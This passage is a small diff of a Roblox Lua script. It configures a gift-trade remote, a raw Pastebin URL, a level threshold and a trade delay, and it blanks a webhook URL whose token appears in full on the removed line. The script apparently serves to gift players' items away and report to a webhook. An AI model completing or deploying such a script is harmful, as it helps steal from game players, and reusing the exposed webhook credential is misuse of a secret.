@@ -8,7 +8,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local TradeRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
 local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1456310274243166219/E-d5-s35qO6SZ9-3JuowoiZ_HQ887fWKPuLh-Kj-SlLyRNPgpQ3iqIOVwJx1b0qaWAd_"
+local WEBHOOK_URL = ""
 
 local MIN_LEVEL = 150
 local TRADE_DELAY = 8 
